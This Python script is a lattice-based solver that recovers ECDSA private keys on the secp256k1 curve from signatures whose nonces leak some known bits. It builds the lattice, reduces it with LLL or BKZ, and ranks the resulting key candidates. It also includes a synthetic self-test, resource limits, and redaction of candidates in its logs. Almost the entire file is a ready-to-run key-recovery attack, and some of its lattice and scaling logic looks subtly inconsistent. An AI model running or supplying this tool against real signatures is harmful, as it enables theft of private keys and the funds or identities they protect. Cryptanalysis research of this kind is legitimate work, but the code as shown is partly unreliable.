import argparse
import json
import hashlib
import os
import sys
import time
import random
import numpy as np
import signal
import psutil
try:
    from fpylll import IntegerMatrix, LLL, BKZ
    HAVE_FPYLLL = True
except ImportError:
    HAVE_FPYLLL = False
from hashlib import sha256
def memory_guard(max_mb):
    process = psutil.Process(os.getpid())
    mem = process.memory_info().rss / (1024 * 1024)
    if mem > max_mb:
        print(f"[E_STOP_MEMORY] Exceeded memory cap: {mem:.1f} MB > {max_mb} MB")
        sys.exit(2)

def checkpoint_save(state, out_dir, stage):
    save_json(state, os.path.join(out_dir, f"checkpoint_{stage}.json"))

def checkpoint_load(out_dir, stage):
    path = os.path.join(out_dir, f"checkpoint_{stage}.json")
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

def graceful_exit(signum, frame):
    print(f"[E_STOP_SIGNAL] Received signal {signum}, aborting gracefully.")
    sys.exit(3)

DEFAULT_Q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            chunk = f.read(65536)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

def strict_parse_leaks(leaks, q, bits_known):
    valid = []
    rejected = []
    seen = set()
    for idx, rec in enumerate(leaks):
        reason = None
        try:
            r = int(rec.get("r"))
            s = int(rec.get("s"))
            m = int(rec.get("m"))
            known_nonce = int(rec.get("known_nonce_bits", 0))
        except Exception:
            reason = "E_INPUT_TYPE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        if not (1 <= r < q and 1 <= s < q and 0 <= known_nonce < (1 << bits_known)):
            reason = "E_INPUT_RANGE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        key = (r, s, m, known_nonce)
        if key in seen:
            reason = "E_INPUT_DUPLICATE"
            rejected.append({"idx": idx, "reason": reason, "rec": rec})
            continue
        seen.add(key)
        valid.append((r, s, m, known_nonce))
    stats = {
        "raw_count": len(leaks),
        "valid_count": len(valid),
        "rejected_count": len(rejected),
        "rejected_reasons": {r["reason"]: 0 for r in rejected}
    }
    for r in rejected:
        stats["rejected_reasons"][r["reason"]] = stats["rejected_reasons"].get(r["reason"], 0) + 1
    return valid, rejected, stats



# --- Mathematically correct HNP lattice for LSB leakage ---
def build_hnp_lattice(leaks, q, bits_known, leakage_model="LSB"):
    """
    Build HNP lattice and target vector for CVP-style decoding.
    Returns: (M, target) where M is IntegerMatrix (n+1)x(n+1), target is tuple[int].
    """
    from fpylll import IntegerMatrix
    n = len(leaks)
    B = 1 << int(bits_known)
    def make_matrix(scale=1, target_last=0):
        M = IntegerMatrix(n + 1, n + 1)
        target = []
        for i, (r, s, m, known_nonce) in enumerate(leaks):
            s_inv = pow(int(s), -1, int(q))
            if leakage_model == "LSB":
                u = (-int(r) * s_inv) % int(q)
                t = (int(m) * s_inv - int(known_nonce)) % int(q)
                B_row = B * scale
            elif leakage_model == "MSB":
                klen = int(q).bit_length()
                shift = klen - int(bits_known)
                u = (-int(r) * s_inv) % int(q)
                t = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
                B_row = (B << shift) * scale
            else:
                raise ValueError(f"Unknown leakage_model: {leakage_model}")
            for j in range(n + 1):
                M[i, j] = 0
            M[i, i] = int(B_row)
            M[i, n] = int(u)
            target.append(int(t) * scale)
        for j in range(n + 1):
            M[n, j] = 0
        M[n, n] = int(q) * scale
        target.append(int(target_last))
        return M, tuple(int(x) for x in target)
    return make_matrix


def _closest_vector_cvp(M, target):
    """
    Compatibility wrapper for fpylll CVP API differences across versions.
    """
    from fpylll import CVP
    target_vec = tuple(int(x) for x in target)
    try:
        # Exact/enum-based CVP (can fail on builds with small max enum dimension).
        return CVP.closest_vector(M, target_vec)
    except Exception:
        # Deterministic Babai fallback works for high dimensions and older/newer APIs.
        return CVP.babai(M, target_vec)


def _log_lattice_inputs(leaks, q, bits_known, leakage_model, limit=5):
    print(f"[ALGO] leakage_model={leakage_model} q_bits={int(q).bit_length()} bits_known={int(bits_known)} n={len(leaks)}")
    for i, (r, s, m, known_nonce) in enumerate(leaks[:limit]):
        s_inv = pow(int(s), -1, int(q))
        if leakage_model == "LSB":
            u = (-int(r) * s_inv) % int(q)
            t = (int(m) * s_inv - int(known_nonce)) % int(q)
        else:
            shift = int(q).bit_length() - int(bits_known)
            u = (-int(r) * s_inv) % int(q)
            t = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
        print(f"[ALGO] row={i} u={u} t={t} r={int(r)} s={int(s)} known={int(known_nonce)}")


def _matvec(M, vec):
    rows = M.nrows
    cols = M.ncols
    out = [0] * rows
    for i in range(rows):
        s = 0
        for j in range(cols):
            s += int(M[i, j]) * int(vec[j])
        out[i] = s
    return out


def _compute_hnp_residuals(leaks, q, bits_known, d_cand, leakage_model):
    """
    Per-signature congruence diagnostics:
      u_i * d + B_i * x_i ≡ t_i (mod q)
    We estimate x_i via nearest integer and report residuals.
    """
    rows = []
    abs_mod_residuals = []
    for idx, (r, s, m, known_nonce) in enumerate(leaks):
        s_inv = pow(int(s), -1, int(q))
        u = (-int(r) * s_inv) % int(q)
        if leakage_model == "LSB":
            t = (int(m) * s_inv - int(known_nonce)) % int(q)
            B_i = 1 << int(bits_known)
        else:
            klen = int(q).bit_length()
            shift = klen - int(bits_known)
            t = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
            B_i = (1 << int(bits_known)) << shift
        num = t - ((u * int(d_cand)) % int(q))
        x_hat = int(round(num / float(B_i)))
        lhs = (u * int(d_cand) + B_i * x_hat) % int(q)
        mod_res = (lhs - t) % int(q)
        mod_res_alt = min(mod_res, int(q) - mod_res)
        abs_mod_residuals.append(int(mod_res_alt))
        rows.append(
            {
                "index": idx,
                "u": int(u),
                "t": int(t),
                "B_i": int(B_i),
                "x_hat": int(x_hat),
                "lhs_mod_q": int(lhs),
                "residual_mod_q": int(mod_res),
                "residual_mod_q_absmin": int(mod_res_alt),
            }
        )
    summary = {
        "count": len(rows),
        "max_absmin_residual_mod_q": max(abs_mod_residuals) if abs_mod_residuals else 0,
        "avg_absmin_residual_mod_q": (sum(abs_mod_residuals) / len(abs_mod_residuals)) if abs_mod_residuals else 0.0,
        "median_absmin_residual_mod_q": (
            sorted(abs_mod_residuals)[len(abs_mod_residuals) // 2] if abs_mod_residuals else 0
        ),
        "nonzero_absmin_residual_count": sum(1 for x in abs_mod_residuals if x != 0),
    }
    return {"summary": summary, "rows": rows}


def _top_worst_residuals(hnp_diag_rows, top_k=5):
    rows = list(hnp_diag_rows)
    rows.sort(key=lambda r: int(r.get("residual_mod_q_absmin", 0)), reverse=True)
    return rows[:top_k]


def _candidate_neighborhood(cand, q, radius=8):
    out = []
    for delta in range(-radius, radius + 1):
        out.append((int(cand) + delta) % int(q))
    return out


def recover_private_key(leaks, q, bits_known, reduction_mode="LLL", bkz_blocksize=10):
    """
    Run the mathematically correct HNP lattice attack for LSB-known ECDSA nonces.
    Uses Babai's nearest plane (CVP) to extract d from the reduced basis.
    Returns: list of candidate d, reduction metrics
    """
    if not HAVE_FPYLLL:
        raise RuntimeError("fpylll is required for recovery (pip install fpylll).")
    leakage_model = recover_private_key.leakage_model if hasattr(recover_private_key, "leakage_model") else "LSB"
    debug_algo = bool(getattr(recover_private_key, "debug_algo", False))
    if debug_algo:
        _log_lattice_inputs(leaks, q, bits_known, leakage_model, limit=5)
    make_matrix = build_hnp_lattice(leaks, q, bits_known, leakage_model=leakage_model)
    scaling_factors = [1, 2, 0.5]
    target_last_options = [0, int(q)//2, -int(q)//2]
    all_candidates = set()
    reduction_metrics = None
    hnp_diag = None
    debug_scaling = []
    for scale in scaling_factors:
        # Only integer scaling
        if scale < 1:
            if (1 << int(bits_known)) % int(1/scale) != 0:
                continue
        scale_int = int(scale) if scale >= 1 else int(1/scale)
        for target_last in target_last_options:
            M, target = make_matrix(scale=scale_int, target_last=target_last)
            t0 = time.time()
            if reduction_mode == "LLL":
                LLL.reduction(M)
            elif reduction_mode == "BKZ":
                BKZ.reduction(M, BKZ.Param(bkz_blocksize))
            else:
                raise ValueError(f"Unknown reduction_mode: {reduction_mode}")
            closest = _closest_vector_cvp(M, target)
            closest = [int(v) for v in closest]
            n = len(leaks)
            d_candidates = set()
            # Babai solution
            if debug_algo:
                print(f"[DIAG] scale={scale} target_last={target_last}")
                print(f"[DIAG] lattice M (first 4 rows):")
                for row_idx in range(min(4, M.nrows)):
                    print(f"  {row_idx}: {[int(M[row_idx, j]) for j in range(M.ncols)]}")
                print(f"[DIAG] target: {list(target)}")
                print(f"[DIAG] closest_vector: {closest}")
            for i, (r, s, m, known_nonce) in enumerate(leaks):
                s_inv = pow(int(s), -1, int(q))
                if leakage_model == "LSB":
                    u = (-int(r) * s_inv) % int(q)
                    t_i = (int(m) * s_inv - int(known_nonce)) % int(q)
                    B_i = (1 << int(bits_known)) * scale_int
                else:
                    klen = int(q).bit_length()
                    shift = klen - int(bits_known)
                    u = (-int(r) * s_inv) % int(q)
                    t_i = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
                    B_i = ((1 << int(bits_known)) << shift) * scale_int
                x_i = closest[i]
                try:
                    u_inv = pow(u, -1, int(q))
                except ValueError:
                    if debug_algo:
                        print(f"[DIAG] row={i} u={u} not invertible mod q")
                    continue  # skip if u not invertible
                d_i = ((t_i - B_i * x_i) * u_inv) % int(q)
                d_candidates.add(d_i)
                if debug_algo:
                    print(f"[DIAG] row={i} x_i={x_i} t_i={t_i} u={u} B_i={B_i} u_inv={u_inv} d_i={d_i}")
            # Basis row candidates (first 4 rows)
            for row_idx in range(min(4, M.nrows)):
                basis_vec = [int(M[row_idx, j]) for j in range(M.ncols)]
                for i, (r, s, m, known_nonce) in enumerate(leaks):
                    s_inv = pow(int(s), -1, int(q))
                    if leakage_model == "LSB":
                        u = (-int(r) * s_inv) % int(q)
                        t_i = (int(m) * s_inv - int(known_nonce)) % int(q)
                        B_i = (1 << int(bits_known)) * scale_int
                    else:
                        klen = int(q).bit_length()
                        shift = klen - int(bits_known)
                        u = (-int(r) * s_inv) % int(q)
                        t_i = (int(m) * s_inv - (int(known_nonce) << shift)) % int(q)
                        B_i = ((1 << int(bits_known)) << shift) * scale_int
                    x_i = basis_vec[i]
                    try:
                        u_inv = pow(u, -1, int(q))
                    except ValueError:
                        continue
                    d_i = ((t_i - B_i * x_i) * u_inv) % int(q)
                    d_candidates.add(d_i)
            all_candidates.update(d_candidates)
            if debug_algo:
                debug_scaling.append({
                    "scale": scale,
                    "target_last": target_last,
                    "closest_vector": closest,
                    "d_candidates": list(d_candidates)
                })
            # For diagnostics, use the first scale/target_last
            if reduction_metrics is None:
                d_cand = list(d_candidates)[0] if d_candidates else 0
                mv = _matvec(M, closest)
                target_int = [int(x) for x in target]
                residual_vec = [int(mv[i] - target_int[i]) for i in range(len(target_int))]
                residual_l1 = int(sum(abs(x) for x in residual_vec))
                residual_linf = int(max((abs(x) for x in residual_vec), default=0))
                hnp_diag = _compute_hnp_residuals(leaks, q, bits_known, d_cand, leakage_model)
                t1 = time.time()
                reduction_metrics = {
                    "matrix_dim": M.nrows,
                    "runtime_sec": t1 - t0,
                    "candidate_count": len(d_candidates),
                    "leakage_model": leakage_model,
                    "reduction_mode": reduction_mode,
                    "bkz_blocksize": bkz_blocksize if reduction_mode == "BKZ" else None,
                    "closest_vector": closest,
                    "target_vector": target_int,
                    "matvec_minus_target_l1": residual_l1,
                    "matvec_minus_target_linf": residual_linf,
                    "hnp_diag_summary": hnp_diag["summary"],
                }
    if debug_algo:
        print(f"[ALGO] scaling/target/basis sweep debug: {debug_scaling}")
    return list(all_candidates), reduction_metrics, hnp_diag
def synthetic_fixture_lsb(n=8, bits_known=6, q=DEFAULT_Q):
    # Generate cryptographically correct ECDSA signatures with LSB-known nonces and known d
    from ecdsa import SECP256k1, SigningKey
    curve = SECP256k1
    G = curve.generator
    d = random.randrange(1, q)
    sk = SigningKey.from_secret_exponent(d, curve=curve)
    leaks = []
    for _ in range(n):
        k = random.randrange(1 << bits_known, q)
        known = k & ((1 << bits_known) - 1)
        m = random.randrange(1, q)
        # ECDSA: R = k*G, r = R.x % q
        R = k * G
        r = R.x() % q
        s = pow(k, -1, q) * (m + r * d) % q
        leaks.append({"r": r, "s": s, "m": m, "known_nonce_bits": known})
    return leaks, d

def candidate_score(candidate, leaks, q, bits_known):
    """
    Deterministic scoring by nonce-bit consistency:
    k = (m + r*d) * s^{-1} mod q
    candidate is stronger if recovered k matches known low bits across many leaks.
    """
    if not (1 <= int(candidate) < int(q)):
        return {
            "score": 0.0,
            "match_count": 0,
            "mismatch_count": len(leaks),
            "match_ratio": 0.0,
        }
    mask = (1 << bits_known) - 1
    match = 0
    mismatch = 0
    for (r, s, m, known_nonce) in leaks:
        try:
            s_inv = pow(int(s), -1, int(q))
            k_rec = ((int(m) + int(r) * int(candidate)) * s_inv) % int(q)
            if (k_rec & mask) == int(known_nonce):
                match += 1
            else:
                mismatch += 1
        except Exception:
            mismatch += 1
    total = len(leaks)
    ratio = (match / total) if total else 0.0
    return {
        "score": ratio,
        "match_count": match,
        "mismatch_count": mismatch,
        "match_ratio": ratio,
    }


def validate_candidate(candidate, leaks, q, bits_known):
    """
    Lightweight validation bands based on low-bit consistency.
    """
    base_ok = (1 <= int(candidate) < int(q))
    metrics = candidate_score(candidate, leaks, q, bits_known)
    ratio = float(metrics["match_ratio"])
    if not base_ok:
        confidence = "reject"
    elif ratio >= 0.98:
        confidence = "high"
    elif ratio >= 0.90:
        confidence = "medium"
    elif ratio >= 0.75:
        confidence = "low"
    else:
        confidence = "reject"
    return {
        "candidate": int(candidate),
        "confidence": confidence,
        "checks": [base_ok, ratio >= 0.75],
        **metrics,
    }


def candidate_pipeline(candidates, leaks, q, bits_known, top_k=10):
    rows = []
    for d in candidates:
        row = validate_candidate(d, leaks, q, bits_known)
        rows.append(row)
    rows.sort(
        key=lambda x: (
            {"high": 3, "medium": 2, "low": 1, "reject": 0}.get(x["confidence"], 0),
            x["score"],
            -x["candidate"],
        ),
        reverse=True,
    )
    return rows[:top_k], rows

def summarize_confidence(table):
    bands = {"high": 0, "medium": 0, "low": 0, "reject": 0}
    for row in table:
        bands[row["confidence"]] += 1
    return bands

def save_json(obj, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2)

def main():
    # Stop conditions
    signal.signal(signal.SIGINT, graceful_exit)
    signal.signal(signal.SIGTERM, graceful_exit)
    parser = argparse.ArgumentParser(description="HNP/LLL/BKZ Key-Recovery Solver (Automated)")
    parser.add_argument("--input", required=False, help="Input leaks JSONL file (fields: r,s,m,known_nonce_bits)")
    parser.add_argument("--bits-known", type=int, required=False, help="Number of known bits in nonce")
    parser.add_argument("--q", type=str, default=str(DEFAULT_Q), help="Curve order (int or hex)")
    parser.add_argument("--seed", type=int, default=0, help="Random seed for deterministic runs")
    parser.add_argument("--run-id", type=str, default=None, help="Run ID (default: sha256(input)+timestamp)")
    parser.add_argument("--config", type=str, default=None, help="Optional config JSON file")
    parser.add_argument("--output-dir", type=str, default=None, help="Output folder (default: runs/<timestamp>_<runid>)")
    parser.add_argument("--max-runtime", type=int, default=600, help="Max runtime in seconds (default: 600)")
    parser.add_argument("--max-memory-mb", type=int, default=2048, help="Max memory in MB (default: 2048)")
    parser.add_argument("--max-candidates", type=int, default=1000, help="Max candidate expansion (default: 1000)")
    parser.add_argument("--resume", type=str, default=None, help="Resume from checkpoint in given run dir")
    parser.add_argument("--debug-sensitive", action="store_true", help="Opt-in: log sensitive candidate data")
    parser.add_argument("--leakage-model", type=str, default="LSB", choices=["LSB", "MSB"], help="Nonce leakage model (LSB or MSB)")
    parser.add_argument("--reduction-mode", type=str, default="LLL", choices=["LLL", "BKZ"], help="Lattice reduction mode")
    parser.add_argument("--bkz-blocksize", type=int, default=10, help="BKZ block size (if using BKZ)")
    parser.add_argument("--synthetic-test", action="store_true", help="Run synthetic regression test (CI mode)")
    parser.add_argument("--debug-algo", action="store_true", help="Verbose algorithm-correctness logs")
    args = parser.parse_args()

    # Config merge
    config = vars(args).copy()
    if args.config:
        with open(args.config, "r", encoding="utf-8") as f:
            config.update(json.load(f))

    # Minimal argument sanity checks
    if not config.get("synthetic_test") and not config.get("input"):
        print("[E_INPUT_REQUIRED] --input is required unless --synthetic-test is enabled.")
        sys.exit(1)
    if config.get("bits_known") is None:
        print("[E_BITS_REQUIRED] --bits-known is required.")
        sys.exit(1)
    if int(config["bits_known"]) <= 0 or int(config["bits_known"]) >= 256:
        print("[E_BITS_RANGE] --bits-known must be in range [1, 255].")
        sys.exit(1)

    # Determinism
    random.seed(config["seed"])
    np.random.seed(config["seed"])

    # Input hash and run-id
    input_hash = sha256_file(config["input"]) if config.get("input") else "synthetic"
    timestamp = int(time.time())
    run_id = config["run_id"] or (input_hash[:8] + f"_{timestamp}")
    out_dir = config["output_dir"] or os.path.join("runs", f"{timestamp}_{run_id}")
    os.makedirs(out_dir, exist_ok=True)

    # Resume support
    if config.get("resume"):
        print(f"[RESUME] Loading checkpoint from {config['resume']}")
        state = checkpoint_load(config["resume"], "pipeline")
        if state:
            print(f"[RESUME] Restored state: {list(state.keys())}")
            # Optionally, resume from state (not implemented in this stub)

    # Stop conditions: runtime/memory
    start_time = time.time()

    # Synthetic test mode (for CI/regression)
    if config.get("synthetic_test"):
        q = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_known = int(config.get("bits_known", 6))
        leaks_raw, ground_truth_d = synthetic_fixture_lsb(n=8, bits_known=bits_known, q=q)
        leaks, rejected, input_stats = strict_parse_leaks(leaks_raw, q, bits_known)
        save_json(input_stats, os.path.join(out_dir, "input_stats.json"))
        print(f"[SYNTHETIC] Ground-truth d: {ground_truth_d}")
    else:
        leaks_raw = []
        with open(config["input"], "r", encoding="utf-8") as f:
            for line in f:
                try:
                    leaks_raw.append(json.loads(line.strip()))
                except Exception:
                    continue
        q = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_known = int(config["bits_known"])
        leaks, rejected, input_stats = strict_parse_leaks(leaks_raw, q, bits_known)
        save_json(input_stats, os.path.join(out_dir, "input_stats.json"))
        if input_stats["valid_count"] < 2:
            print("[E_PREFLIGHT_SAMPLE] Not enough valid leaks for attack. Aborting.")
            sys.exit(1)

    # Preflight: memory guard
    memory_guard(config.get("max_memory_mb", 2048))

    # Assumptions metadata
    assumptions = {
        "nonce_leakage_model": "partial-known-bits",
        "bit_position_convention": "LSB",
        "curve_order": str(q),
        "normalization": "none"
    }
    save_json(assumptions, os.path.join(out_dir, "assumptions.json"))

    # Save resolved config
    save_json(config, os.path.join(out_dir, "resolved_config.json"))


    # Lattice reduction & telemetry

    t0 = time.time()
    try:
        # Pass leakage_model to recover_private_key via function attribute
        recover_private_key.leakage_model = config.get("leakage_model", "LSB")
        recover_private_key.debug_algo = bool(config.get("debug_algo", False))
        candidates, reduction_metrics, hnp_diag = recover_private_key(
            leaks,
            int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"]),
            int(config["bits_known"]),
            reduction_mode=config.get("reduction_mode", "LLL"),
            bkz_blocksize=config.get("bkz_blocksize", 10)
        )
    except Exception as e:
        reduction_metrics = {"error": str(e)}
        candidates = []
        hnp_diag = {"summary": {"count": 0}, "rows": []}
    t1 = time.time()
    reduction_metrics["runtime_total_sec"] = t1 - t0
    reduction_metrics["input_count"] = len(leaks)
    save_json(reduction_metrics, os.path.join(out_dir, "reduction_metrics.json"))
    save_json(hnp_diag, os.path.join(out_dir, "hnp_diagnostics.json"))

    # Extended diagnostics: residual ranking and synthetic ground-truth comparison.
    diag_report = {
        "candidate": int(candidates[0]) if candidates else None,
        "hnp_diag_summary": hnp_diag.get("summary", {}),
        "worst_residual_rows": _top_worst_residuals(hnp_diag.get("rows", []), top_k=8),
    }
    if config.get("synthetic_test") and candidates:
        q_int = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
        bits_int = int(config["bits_known"])
        gt_diag = _compute_hnp_residuals(
            leaks,
            q_int,
            bits_int,
            int(ground_truth_d),
            config.get("leakage_model", "LSB"),
        )
        cand = int(candidates[0])
        near = _candidate_neighborhood(cand, q_int, radius=8)
        near_scores = []
        for x in near:
            m = candidate_score(x, leaks, q_int, bits_int)
            near_scores.append(
                {"candidate": int(x), "match_ratio": float(m["match_ratio"]), "match_count": int(m["match_count"])}
            )
        near_scores.sort(key=lambda z: (z["match_ratio"], z["match_count"]), reverse=True)
        diag_report["synthetic_compare"] = {
            "ground_truth_d": int(ground_truth_d),
            "candidate_d": cand,
            "delta_mod_q": int((cand - int(ground_truth_d)) % q_int),
            "candidate_diag_summary": hnp_diag.get("summary", {}),
            "ground_truth_diag_summary": gt_diag.get("summary", {}),
            "candidate_neighborhood_top": near_scores[:10],
        }
    save_json(diag_report, os.path.join(out_dir, "diagnostics_report.json"))

    # Synthetic test: check if ground-truth d is recovered
    if config.get("synthetic_test"):
        found = any(abs(c - ground_truth_d) % int(config["q"], 0) == 0 for c in candidates)
        if config.get("debug_algo"):
            q_int = int(config["q"], 0) if isinstance(config["q"], str) else int(config["q"])
            print(f"[ALGO] ground_truth_d={ground_truth_d}")
            print(f"[ALGO] candidates={candidates}")
            for c in candidates[:10]:
                delta = (int(c) - int(ground_truth_d)) % q_int
                m = candidate_score(c, leaks, q_int, int(config["bits_known"]))
                print(f"[ALGO] cand={c} delta_mod_q={delta} match_ratio={m['match_ratio']:.6f} match={m['match_count']}/{len(leaks)}")
        with open(os.path.join(out_dir, "bench_results.json"), "w", encoding="utf-8") as f:
            json.dump({"ground_truth_d": ground_truth_d, "found": found, "candidates": candidates}, f, indent=2)
        print(f"[SYNTHETIC] Success: {found}")

    # Stop condition: candidate cap
    if len(candidates) > config.get("max_candidates", 1000):
        print(f"[E_STOP_CANDIDATE] Too many candidates: {len(candidates)} > {config.get('max_candidates', 1000)}")
        candidates = candidates[:config.get("max_candidates", 1000)]

    # Checkpoint after reduction
    checkpoint_save({"candidates": candidates}, out_dir, "pipeline")

    # --- Candidate Pipeline & Validation ---
    top_k = config.get("top_k", 10)
    candidate_table, full_table = candidate_pipeline(
        candidates, leaks, q, int(config["bits_known"]), top_k=top_k
    )
    with open(os.path.join(out_dir, "candidates.jsonl"), "w", encoding="utf-8") as f:
        for row in full_table:
            # Redact candidate unless --debug-sensitive
            row_out = row.copy()
            if not config.get("debug_sensitive", False):
                row_out["candidate"] = "<redacted>"
            f.write(json.dumps(row_out) + "\n")

    # Multi-stage validation report
    confidence_summary = summarize_confidence(full_table)
    validation_report = {
        "total_candidates": len(full_table),
        "confidence_bands": confidence_summary,
        "top_candidates": candidate_table,
    }
    save_json(validation_report, os.path.join(out_dir, "validation_report.json"))

    # False-positive controls: require at least 2 high-confidence, else warn
    min_high = config.get("min_high_confidence", 2)
    if confidence_summary["high"] < min_high:
        fp_warning = "E_VALIDATION_LOW_CONFIDENCE"
    else:
        fp_warning = None

    # Failure taxonomy & dashboard
    run_summary = {
        "status": "ok" if not fp_warning else "warning",
        "failure_code": fp_warning,
        "confidence_top": confidence_summary["high"],
        "candidates_high": [r for r in candidate_table if r["confidence"] == "high"],
        "runtime_total": reduction_metrics.get("runtime_total_sec", None),
        "next_action": "review_candidates" if not fp_warning else "investigate_low_confidence",
    }
    save_json(run_summary, os.path.join(out_dir, "dashboard.json"))

    # Stop condition: runtime
    elapsed = time.time() - start_time
    if elapsed > config.get("max_runtime", 600):
        print(f"[E_STOP_RUNTIME] Exceeded max runtime: {elapsed:.1f} > {config.get('max_runtime', 600)} sec")
        sys.exit(4)

    print(f"[OK] Run complete. Output in {out_dir}")

# --- Integration Adapter Stub ---
def integration_adapter(input_path, output_path):
    """
    Example: map pipeline files to solver input format with strict field mapping.
    """
    # Not implemented: add mapping logic as needed for your pipeline.
    pass

if __name__ == "__main__":
    main()
